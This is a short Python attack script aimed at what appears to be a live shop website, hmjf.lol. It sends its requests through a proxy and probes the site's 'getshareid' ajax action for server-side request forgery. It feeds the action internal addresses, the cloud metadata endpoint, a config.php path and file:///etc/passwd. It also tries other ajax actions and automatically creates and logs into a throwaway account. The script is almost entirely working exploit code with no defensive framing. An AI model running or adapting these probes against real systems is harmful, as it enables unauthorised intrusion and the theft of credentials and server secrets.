#!/usr/bin/env python3
"""getshareid SSRF + getshareid/gift probes"""
import subprocess, re, os, json

PX = [l.split("=", 1)[1].strip().strip('"') for l in open("/data/config/proxy.env") if l.startswith("PROXY_URL=")][0]
UA = "Mozilla/5.0"
REF = "https://hmjf.lol/shop/"
B = "https://hmjf.lol/shop"
CK = "/tmp/ssrf.ck"
HS = "256"

def c(url, post=None):
    cmd = ["curl", "-s", "--max-time", "18", "-x", PX, "-A", UA, "-H", f"Referer: {REF}", "-b", CK, "-c", CK]
    if post is not None:
        cmd += ["-X", "POST", "-d", post, "-H", "Content-Type: application/x-www-form-urlencoded"]
    cmd.append(url)
    return subprocess.run(cmd, capture_output=True, text=True).stdout

if os.path.exists(CK):
    os.remove(CK)
c(f"{B}/?mod=buy&tid=72")

urls = [
    "http://127.0.0.1/",
    "http://127.0.0.1/shop/config.php",
    "http://localhost/shop/install/",
    "http://169.254.169.254/latest/meta-data/",
    "file:///etc/passwd",
    "https://hmjf.lol/shop/install/install.lock",
]
print("=== getshareid SSRF ===")
for u in urls:
    import urllib.parse
    post = f"url={urllib.parse.quote(u)}&hashsalt={HS}"
    r = c(f"{B}/ajax.php?act=getshareid", post=post)
    print(u[:50], "->", r[:180])

print("\n=== getshareid POST acts ===")
for act in ["SharePoster", "getshareid", "gift_start", "captcha"]:
    post = f"url=http://127.0.0.1/&hashsalt={HS}"
    r = c(f"{B}/ajax.php?act={act}", post=post)
    if r.strip():
        print(act, r[:150])

print("\n=== reg user probe ===")
page = c(f"{B}/user/reg.php")
csrf = re.search(r'csrf_token\s*=\s*"([^"]+)"', page)
if csrf:
    user = f"probe{os.getpid()}x"
    post = f"user={user}&pass=Test123456!&qq=1234567890&email={user}@t.com&csrf_token={csrf.group(1)}"
    r = c(f"{B}/user/reg.php", post=post)
    print("reg", r[:200] if r else "empty")
    r2 = c(f"{B}/user/login.php", post=f"user={user}&pass=Test123456!&code=0000")
    print("login", "成功" in r2 or "location" in r2.lower(), r2[:150])
